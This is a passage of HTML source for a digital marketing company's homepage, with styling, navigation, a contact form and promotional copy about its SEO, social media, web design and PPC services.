			.vc_custom_1592194839953 {
				padding-top: 30px !important;
				padding-bottom: 30px !important;
			}

			.vc_custom_1591870685248 {
				padding-top: 80px !important;
				padding-bottom: 80px !important;
			}

			.vc_custom_1591871032404 {
				padding-top: 20px !important;
			}

			.vc_custom_1591941279069 {
				padding-top: 50px !important;
			}

			.vc_custom_1591941102101 {
				padding-top: 30px !important;
			}

			.vc_custom_1591942141839 {
				padding-top: 30px !important;
				padding-bottom: 50px !important;
			}

			.vc_custom_1592194980448 {
				margin-top: 30px !important;
				margin-bottom: 30px !important;
				border-top-width: 1px !important;
				border-bottom-width: 1px !important;
				padding-top: 15px !important;
				padding-bottom: 15px !important;
				border-top-color: #c9c9c9 !important;
				border-top-style: solid !important;
				border-bottom-color: #c9c9c9 !important;
				border-bottom-style: solid !important;
			}

			.vc_custom_1591883117536 {
				padding-top: 30px !important;
			}

			.vc_custom_1591882318096 {
				padding-top: 30px !important;
			}

			.vc_custom_1592195201144 {
				padding-top: 30px !important;
				padding-bottom: 30px !important;
			}

			.vc_custom_1591870685248 {
				padding-top: 80px !important;
				padding-bottom: 80px !important;
			}

			.vc_custom_1592043991868 {
				padding-top: 20px !important;
			}

			.vc_custom_1591873095192 {
				padding-top: 30px !important;
			}

			.vc_custom_1591873095192 {
				padding-top: 30px !important;
			}

			.vc_custom_1593773449258 {
				padding-top: 30px !important;
				padding-bottom: 30px !important;
			}

			.vc_custom_1591886282652 {
				padding-top: 30px !important;
			}

			.vc_custom_1592195481712 {
				padding-top: 30px !important;
				padding-bottom: 30px !important;
			}

			.vc_custom_1591876258275 {
				padding-top: 10px !important;
				padding-bottom: 10px !important;
			}

			.vc_custom_1591944334616 {
				padding-top: 30px !important;
			}

			.vc_custom_1591944291601 {
				padding-bottom: 30px !important;
			}

			.vc_custom_1591945684216 {
				margin-top: 30px !important;
				margin-bottom: 30px !important;
				border-top-width: 1px !important;
				border-bottom-width: 1px !important;
				padding-top: 15px !important;
				padding-bottom: 15px !important;
				border-top-color: #c9c9c9 !important;
				border-top-style: solid !important;
				border-bottom-color: #c9c9c9 !important;
				border-bottom-style: solid !important;
			}

			.vc_custom_1592032777927 {
				padding-top: 30px !important;
			}

			.vc_custom_1592195720175 {
				padding-top: 30px !important;
				padding-bottom: 30px !important;
			}

			.vc_custom_1591950608806 {
				padding-top: 80px !important;
			}

			.vc_custom_1591950645037 {
				padding-top: 30px !important;
				padding-bottom: 50px !important;
			}

			.vc_custom_1591950636488 {
				padding-bottom: 10px !important;
			}

			.vc_custom_1592195930641 {
				padding-bottom: 30px !important;
			}

			.vc_custom_1591953656545 {
				padding-bottom: 30px !important;
			}

			.vc_custom_1592385680081 {
				padding-top: 15px !important;
				padding-bottom: 30px !important;
			}
		</style><noscript>
			<style>
				.wpb_animate_when_almost_visible {
					opacity: 1;
				}
			</style>
		</noscript>
</head>

<body
	class="home page-template page-template-full_width page-template-full_width-php page page-id-21 bridge-core-2.3.1  qode-page-loading-effect-enabled qode-title-hidden qode_grid_1300 qode-child-theme-ver-1.0.0 qode-theme-ver-21.7.1 qode-theme-bridge qode_header_in_grid wpb-js-composer js-comp-ver-6.2.0 vc_responsive"
	itemscope itemtype="http://schema.org/WebPage">




	<div class="wrapper">
		<div class="wrapper_inner">





			<header class=" has_top scroll_header_top_area  stick scrolled_not_transparent page_header">
				<div class="header_inner clearfix">
					<div class="header_top_bottom_holder">
						<div class="header_top clearfix" >
							<div class="container">
								<div class="container_inner clearfix">
									<div class="left">
										<div class="inner">
											<div
												class="widget_text header-widget widget_custom_html header-left-widget">
												<div class="textwidget custom-html-widget">
													<div class="Header-top-left-1">
														<ul>
															<li><a href="tel:+91-8285635636"><i class="fa fa-phone"
																		aria-hidden="true"></i>
																	+91-8285635636</a></li>
															<li><a href="mailto:info@webuthinks.com"><i
																		class="fa fa-envelope" aria-hidden="true"></i>
																	info@webuthinks.com</a></li>
														</ul>
													</div>
												</div>
											</div>
										</div>
									</div>
									<div class="right">
										<div class="inner">
											<div
												class="widget_text header-widget widget_custom_html header-right-widget">
												<div class="textwidget custom-html-widget">
													<div class="Header-top-right-2">
														<ul>
															<li class="ficon1"><a href="https://www.facebook.com/"><i
																		class="fa fa-facebook"
																		aria-hidden="true"></i></a></li>
															<li class="ficon2"><a href="https://twitter.com/"><i
																		class="fa fa-twitter"
																		aria-hidden="true"></i></a></li>
															<li class="ficon3"><a href="https://www.instagram.com/"><i
																		class="fa fa-instagram"
																		aria-hidden="true"></i></a></li>
															<li class="ficon4"><a href="#"><i class="fa fa-youtube-play"
																		aria-hidden="true"></i></a></li>

															</a></li>
														</ul>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>

						<div class="header_bottom clearfix">
							<div class="container">
								<div class="container_inner clearfix">
									<div class="header_inner_left">
										<div class="mobile_menu_button">
											<span>
												<i class="qode_icon_font_awesome fa fa-bars "></i> </span>
										</div>
										<div class="logo_wrapper">
											<div class="q_logo">
												<a itemprop="url" href="index.html">
													<img itemprop="image" alt="Logo"
														data-src="./image/logo.png"
														class="normal lazyload"
														src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
															itemprop="image" class="normal"
															src="./image/logo.png"
															alt="Logo"></noscript> <img itemprop="image" alt="Logo"
														data-src="./image/logo.png"
														class="light lazyload"
														src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
															itemprop="image" class="light"
															src="./image/logo.png"
															alt="Logo" /></noscript> <img itemprop="image" alt="Logo"
														data-src="./image/logo.png"
														class="dark lazyload"
														src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
															itemprop="image" class="dark"
															src="./image/logo.png"
															alt="Logo" /></noscript> <img itemprop="image" alt="Logo"
														data-src="./image/logo.png"
														class="sticky lazyload"
														src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
															itemprop="image" class="sticky"
															src="./image/logo.png"
															alt="Logo" /></noscript> <img itemprop="image" alt="Logo"
														data-src="./image/logo.png"
														class="mobile lazyload"
														src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
															itemprop="image" class="mobile"
															src="./image/logo.png"
															alt="Logo" /></noscript> </a>
											</div>
										</div>
									</div>
									<div class="header_inner_right">
										<div class="side_menu_button_wrapper right">
											<div class="header_bottom_right_widget_holder">
												<div class="widget_text header_bottom_widget widget_custom_html">
													<div class="textwidget custom-html-widget">
														<div class="call-now-btn">
															<a href="tel:8285635636">Call Now</a>
														</div>
													</div>
												</div>
											</div>
											<div class="side_menu_button">

											</div>
										</div>
									</div>


									<nav class="main_menu drop_down right">
										<ul id="menu-main-menu" class="">
											<li id="nav-menu-item-12"
												class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home active narrow">
												<a href="index.html" class=" current "><i
														class="menu_icon blank fa"></i><span>Home<span
															class="underline_dash"></span></span><span
														class="plus"></span></a></li>
											<li id="nav-menu-item-13"
												class="menu-item menu-item-type-custom menu-item-object-custom  narrow">
												<a href="#About" class=""><i
														class="menu_icon blank fa"></i><span>About<span
															class="underline_dash"></span></span><span
														class="plus"></span></a></li>
											<li id="nav-menu-item-14"
												class="menu-item menu-item-type-custom menu-item-object-custom  narrow">
												<a href="#Services" class=""><i
														class="menu_icon blank fa"></i><span>Service<span
															class="underline_dash"></span></span><span
														class="plus"></span></a></li>
											<li id="nav-menu-item-17"
												class="menu-item menu-item-type-custom menu-item-object-custom  narrow">
												<a href="#portfolio" class=""><i
														class="menu_icon blank fa"></i><span>Portfolio<span
															class="underline_dash"></span></span><span
														class="plus"></span></a></li>
											<li id="nav-menu-item-16"
												class="menu-item menu-item-type-custom menu-item-object-custom  narrow">
												<a href="#contact" class=""><i
														class="menu_icon blank fa"></i><span>Contact<span
															class="underline_dash"></span></span><span
														class="plus"></span></a></li>
										</ul>
									</nav>
									<nav class="mobile_menu">
										<ul id="menu-main-menu-1" class="">
											<li id="mobile-menu-item-12"
												class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home active">
												<a href="index.html" class=" current "><span>Home</span></a><span
													class="mobile_arrow"><i class="fa fa-angle-right"></i><i
														class="fa fa-angle-down"></i></span></li>
											<li id="mobile-menu-item-13"
												class="menu-item menu-item-type-custom menu-item-object-custom "><a
													href="#About" class=""><span>About</span></a><span
													class="mobile_arrow"><i class="fa fa-angle-right"></i><i
														class="fa fa-angle-down"></i></span></li>
											<li id="mobile-menu-item-14"
												class="menu-item menu-item-type-custom menu-item-object-custom "><a
													href="#Services" class=""><span>Service</span></a><span
													class="mobile_arrow"><i class="fa fa-angle-right"></i><i
														class="fa fa-angle-down"></i></span></li>
											<li id="mobile-menu-item-17"
												class="menu-item menu-item-type-custom menu-item-object-custom "><a
													href="#portfolio" class=""><span>Portfolio</span></a><span
													class="mobile_arrow"><i class="fa fa-angle-right"></i><i
														class="fa fa-angle-down"></i></span></li>
											<li id="mobile-menu-item-16"
												class="menu-item menu-item-type-custom menu-item-object-custom "><a
													href="#contact" class=""><span>Contact</span></a><span
													class="mobile_arrow"><i class="fa fa-angle-right"></i><i
														class="fa fa-angle-down"></i></span></li>
										</ul>
									</nav>
								</div>
							</div>
						</div>
					</div>
				</div>

			</header> <a id="back_to_top" href="#">
				<span class="fa-stack">
					<i class="qode_icon_font_awesome fa fa-arrow-up "></i> </span>
			</a>





			<div class="content content_top_margin_none">
				<div class="content_inner  ">
					<div class="full_width">
						<div class="full_width_inner">
							<div class="vc_row wpb_row section vc_row-fluid  vc_custom_1592390219472 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591863539272"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-8">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2
																					style="font-size: 35px; text-transform: capitalize; font-weight: 600; color: #fff; text-align:center; 2px 2px black;">
																					<span style="color: #ffffff;">We
																						Offer Online
																						Marketing</span><br />
																					<span
																						style="color: #ffffff;"><strong>Services
																							to Expand
																							Your</strong></span><br />
																					<span
																						style="color: #ffffff;">Enterprises</span>
																				</h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592388541814">
																			<div class="wpb_wrapper">
																				<p
																					style="font-size: 28px; line-height: 40px;">
																					<span style="color: #ffffff;">We are
																						Google Certified SEO and Digital
																						Marketing Company with a mission
																						to put your business at the
																					</span><span
																						style="color: #ed8420;"><strong><span
																								style="color: #ffffff;">forefront
																								of prospective
																								customers</span>
																						</strong></span></p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner vc_custom_1592192296295">
																	<div class="wpb_wrapper">
																		<div role="form" class="wpcf7"
																			id="wpcf7-f39-p21-o1" lang="en-US"
																			dir="ltr">
																			<div class="screen-reader-response">
																				<p role="status" aria-live="polite"
																					aria-atomic="true"></p>
																				<ul></ul>
																			</div>
																			<form
																			method="post" name="contact_form"
																			action="cont.php"
																				class="wpcf7-form init cf7_custom_style_1"
																				novalidate="novalidate"
																				data-status="init">
																				<div style="display: none;">
																					<input type="hidden" name="_wpcf7"
																						value="39" />
																					<input type="hidden"
																						name="_wpcf7_version"
																						value="5.4.1" />
																					<input type="hidden"
																						name="_wpcf7_locale"
																						value="en_US" />
																					<input type="hidden"
																						name="_wpcf7_unit_tag"
																						value="wpcf7-f39-p21-o1" />
																					<input type="hidden"
																						name="_wpcf7_container_post"
																						value="21" />
																					<input type="hidden"
																						name="_wpcf7_posted_data_hash"
																						value="" />
																					<input type="hidden"
																						name="_wpcf7_recaptcha_response"
																						value="" />
																				</div>
																				<div class="my-sl-form">
																					<h3>Yes, Help me Grow ! </h3>
																					<p><label> <span
																								class="wpcf7-form-control-wrap your-name"><input
																									type="text"
																									name="name"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="Your Name" /></span>
																						</label></p>
																					<p><label> <span
																								class="wpcf7-form-control-wrap your-email"><input
																									type="email"
																									name="email"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="Your Email" /></span>
																						</label></p>
																					<p><label> <span
																								class="wpcf7-form-control-wrap Mobile"><input
																									type="tel"
																									name="num"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-tel wpcf7-validates-as-required wpcf7-validates-as-tel"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="Your Mobile Number" /></span></label>
																					</p>
																					<p><label> <span
																						class="wpcf7-form-control-wrap Mobile"><input
																							type="tel"
																							name="message"
																							value="" size="40"
																							class="wpcf7-form-control wpcf7-text wpcf7-tel wpcf7-validates-as-required wpcf7-validates-as-tel"
																							aria-required="true"
																							aria-invalid="false"
																							placeholder="Enter Your Message" /></span></label>
																			</p>
																					<p class="bt-ss"><input
																							type="submit" value="Send"
																							class="wpcf7-form-control wpcf7-submit" />
																					</p>
																				</div>
																				<div class="wpcf7-response-output"
																					aria-hidden="true"></div>
																			</form>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div id="About"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592048645134 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591868691386"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-5">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div class="separator control-sep-ab normal   "
																			style="background-color: #ed8420;"></div>

																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2
																					style="text-align: right; font-size: 84px; font-weight: bold; color: #000; line-height: 84px; padding-right: 40px;">
																					WHO<br />
																					ARE<br />
																					WE!</h2>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-7">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<p
																					style="font-weight: 600; color: #242424; font-size: 20px; text-align: justify;">
																					Online marketing, often known as digital marketing, is a crucial business tool for your firm in the modern era. You can use it to increase the power of the internet and grow your business. Additionally, it increases website traffic, increases visibility across search results, and engages audiences to convert them into customers.</p>

																			</div>
																		</div>
																		<div class="separator control-ab-cont normal   "
																			 ></div>

																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1593773235690">
																			<div class="wpb_wrapper">
																				<div class="defineFloat whoInner">
																					<p style="text-align: justify;">
																						<span style="color: #000000;">At
																							<strong>webuthink Pvt
																								Ltd</strong>, we provide
																							a range of services to help
																							your business grow. We
																							enable you to resolve the
																							obstacles and address
																							problems relevant to
																							optimizing your online
																							presence. We give
																							comprehensive
																							<em><strong>digital
																									marketing
																									services</strong></em>
																							to make sure that your
																							company website reaches its
																							peak and can persist despite
																							competition in the market.
																							We enable you to resolve the
																							obstacles and address
																							problems relevant to
																							optimizing your online
																							presence. From
																							<em><strong>SMO</strong></em>,
																							<em><strong>SEO</strong></em>,
																							<em><strong>Content
																									Marketing</strong></em>,
																							<em><strong>PPC</strong></em>,
																							<em><strong>ORM</strong></em>,
																							<em><strong>Facebook
																									Marketing</strong></em>,
																							and many more, we excel in
																							every aspect of online
																							marketing and create a
																							perfect mix of these
																							strategies to provide your
																							business with a
																							result-oriented plan.</span>
																					</p>
																				</div>

																			</div>
																		</div>
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="btn-wl-mn">
																					<ul>
																						<li><a
																								href="tel:+91-8285635636"><img
																									data-src='./image/call-icon-d.png'
																									class='lazyload'
																									src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img
																										src="wp-content/uploads/2020/06/call-icon-d.png"></noscript></a>
																						</li>
																						<li><a
																								href="https://api.whatsapp.com/send?phone=918285635636"><img
																									data-src='./image/whatsapp-icon.png'
																									class='lazyload'
																									src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img
																										src="wp-content/uploads/2020/06/whatsapp-icon.png"></noscript>
																						<li><a
																								href="https://skype.com"><img
																									data-src='./image/skype.png'
																									class='lazyload'
																									src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img
																										src="wp-content/uploads/2020/06/skype.png"></noscript></a>
																						</li>
																						</a></li>
																					</ul>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div id="Services"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592391101831 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div
											class="wpb_column vc_column_container vc_col-sm-12 vc_hidden-sm vc_hidden-xs">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h1 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #ffffff;">Web
																						Marketing Services</span></h1>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592194839953">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #ffffff;">webuthink
																						Pvt Ltd is recognized as the
																						best digital marketing company
																						which is seamlessly helping the
																						small businesses to create
																						websites, Google promotion city
																						&amp; country-wise, specialized
																						SEO, e-commerce website,
																						Facebook ads, Google Adwords,
																						and many more.</span></p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-frist-services vc_custom_1591883117536"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder"><img
																					itemprop="image"  alt=""
																					data-src="./image/search.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image" 
																						src="wp-content/uploads/2020/06/search.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder" >
																				<div class="icon_text_inner" >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 400;">
																						Search Engine Optimization</h3>
																					<p style='color: #ffffff'>Do you
																						want to get more customers,
																						generate leads, and sales? Then,
																						begin from where 90% of online
																						marketing begins, i.e. search
																						engines. Build your long-term
																						influence and use search engine
																						optimization (SEO) to get more
																						professional web traffic,
																						revenues, and leads.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"  alt=""
																					data-src="./image/social-media-logo.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image" 
																						src="wp-content/uploads/2020/06/social-media-logo.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder" >
																				<div class="icon_text_inner" >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 200;">
																						Social Media Marketing</h3>
																					<p style='color: #ffffff'>Social
																						networking is becoming
																						significant with every passing
																						day. Hence, we have highly
																						effective tools that include,
																						monitoring, channel &amp;
																						competitor research, interaction
																						with social media, and social
																						marketing campaigns.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-why-c-box-control control-frist-services vc_custom_1591882318096"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image" alt=""
																					data-src="./image/coding.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image" 
																						src="wp-content/uploads/2020/06/coding.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder" >
																				<div class="icon_text_inner" >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 200;">
																						Web Design &amp; Development
																					</h3>
																					<p style='color: #ffffff'>Initial
																						impressions are really important
																						and we can get this offer
																						straight away signed for you. We
																						function in a consultative
																						manner as your website
																						management service, acting as
																						your designers, advisors, and
																						developers.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"  alt=""
																					data-src="./image/pay-per-click.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image" 
																						src="wp-content/uploads/2020/06/pay-per-click.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 200;">
																						PPC Management</h3>
																					<p style='color: #ffffff'>Pay Per
																						Click management is done by PPC
																						professionals who are certified
																						by Google Adwords. Customized
																						service and reporting also
																						conducted. We also engage in the
																						landing pages and advertisements
																						for conversions.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="vc_row wpb_row section vc_row-fluid  vc_custom_1591870201684"
								style=' text-align:left;'>
								<div class=" full_section_inner clearfix">
									<div class="wpb_column vc_column_container vc_col-sm-12">
										<div class="vc_column-inner">
											<div class="wpb_wrapper">
												<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591870685248 grid_section"
													style=' text-align:center;'>
													<div class=" section_inner clearfix">
														<div class='section_inner_margin clearfix'>
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2
																					style="text-align: center; font-size: 46px; color: #fff; font-weight: bold;">
																					Do you Need a Certified Digital
																					Marketing Expert Advice for your
																					Business?</h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; color: #dfdfdf; font-size: 18px; font-weight: 600; padding: 10px 0px;">
																					Now Click the Button Below &amp; We
																					Shall Get in Touch With You in the
																					Next 30 Minutes!</p>

																			</div>
																		</div>
																		<div class="separator call-to-sepppp normal   "
																			style="background-color: #729abf;"></div>
																		<a itemprop="url" href="#contact" target="_self"
																			data-hover-background-color='#29364a'
																			data-hover-border-color='#29364a'
																			data-hover-color='#ffffff'
																			class="qbutton  large center default control-call-to-action-btnm"
																			style="color: #ffffff; border-color: #ed8420; background-color: #ed8420;">Get
																			the Expert Advice</a>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1591871032404">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><a
																						style="font-size: 15px; color: #d3d3d3; font-style: italic;"
																						href="tel:+91-8285635636">Have a
																						question? Call us on
																						+91-8285635636</a></p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<section data-speed="1" class="parallax_section_holder  "
								style=" height:px; background-image:url('./image/seoCompany.jpg');">
								<div class="parallax_content left">
									<div class='parallax_section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591941279069"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #000000;">What is
																						the benefit of online
																						marketing</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592194980448">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; font-size: 18px; font-weight: 600;">
																					<span style="color: #000000;">There
																						are reasons why you should
																						choose us for your next internet
																						marketing project.</span></p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  online-marketing-section vc_custom_1591941102101"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title tiny custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image" alt=""
																					data-src="./image/money.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image" 
																						src="wp-content/uploads/2020/06/money.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Low Operation Cost</h3>
																					<div class="separator  small left  "
																						style="margin-top: 0px;margin-bottom: 15px;background-color: #29364a;height: 2px;width: 20px;">
																					</div>
																					<p style='color: #000000'>One can
																						advertise affordably with the
																						help of online marketing and get
																						a free listing in many business
																						directories.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title tiny custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/assistant.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/assistant.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						24X7 Availability</h3>
																					<div class="separator  small left  "
																						style="margin-top: 0px;margin-bottom: 15px;background-color: #29364a;height: 2px;width: 20px;">
																					</div>
																					<p style='color: #000000'>It helps
																						in reducing the costs and run
																						around the clock when compared
																						to conventional marketing.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title tiny custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/demographic.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/demographic.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Demographic Targeting</h3>
																					<div class="separator  small left  "
																						style="margin-top: 0px;margin-bottom: 15px;background-color: #29364a;height: 2px;width: 20px;">
																					</div>
																					<p style='color: #000000'>With
																						demographic targeting, your
																						marketing efforts can be more
																						focused on specific demographic
																						regions.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  online-marketing-section vc_custom_1591942141839"
														style=' text-align:left;'>
